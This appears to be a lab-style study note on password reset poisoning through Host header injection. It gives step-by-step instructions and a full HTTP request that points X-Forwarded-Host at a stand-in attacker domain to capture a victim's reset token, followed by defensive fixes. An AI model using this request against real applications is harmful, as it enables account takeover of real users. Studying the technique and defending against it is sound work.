# 03. Password Reset Poisoning (Host Header Injection)

Password reset poisoning abuses the server's own link-generation logic to hijack a victim's secret reset token before they ever click it.

---

## Root Cause

When building absolute password-reset URLs for outgoing emails, applications sometimes dynamically read untrusted HTTP headers—such as `Host` or `X-Forwarded-Host`—instead of using a statically configured application origin.

## How to Find It (Step-by-Step)

1. **Intercept the Reset Request**
   Capture the `POST /forgot-password` request in Burp Suite where the target username or email is submitted.

2. **Inject Routing Headers**
   Add or modify the `X-Forwarded-Host` header (or test `Host` header overrides) to point to your **Exploit Server** or **Burp Collaborator** domain:
   ```http
   POST /forgot-password HTTP/2
   Host: target-app.example
   X-Forwarded-Host: attacker-exploit-server.example
   Content-Type: application/x-www-form-urlencoded

   username=carlos
   ```

3. **Monitor Server Logs**
   Watch your Exploit Server access logs or Burp Collaborator interactions. When the victim clicks the poisoned link in their inbox, an incoming request containing `?temp-forgot-password-token=...` will appear in your logs.

4. **Execute Account Takeover**
   Take the captured token and submit it directly against the **real** target website to reset the victim's password.

---

## Defensive Engineering

- **Allowlist Permitted Hosts**
  Validate the incoming `Host` header at the reverse proxy and application layer against an explicit allowlist of authorized domains.
- **Static Base URLs**
  Hardcode the canonical base URL (e.g., `APP_BASE_URL`) inside server configuration rather than constructing password-reset or OAuth redirect links dynamically from HTTP request headers.
- **Strip Untrusted Forwarding Headers**
  Configure edge proxies/load balancers to strip or overwrite client-supplied `X-Forwarded-Host` headers.
